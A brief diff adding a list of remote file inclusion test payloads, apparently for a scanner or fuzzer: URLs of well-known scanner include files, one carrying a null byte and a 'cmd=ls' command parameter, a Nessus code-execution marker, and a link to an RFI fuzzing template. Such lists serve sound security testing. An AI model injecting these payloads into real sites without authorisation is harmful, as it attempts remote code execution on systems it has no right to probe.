@@ -1,0 +1,9 @@
+https://cirt.net/rfiinc.txt
+
+https://cirt.net/rfiinc.txt?%00&cmd=ls
+
+https://rfi.nessus.org/rfi.txt
+
+"NessusCodeExecTest"
+
+https://github.com/projectdiscovery/fuzzing-templates/blob/main/rfi/rfi.yaml
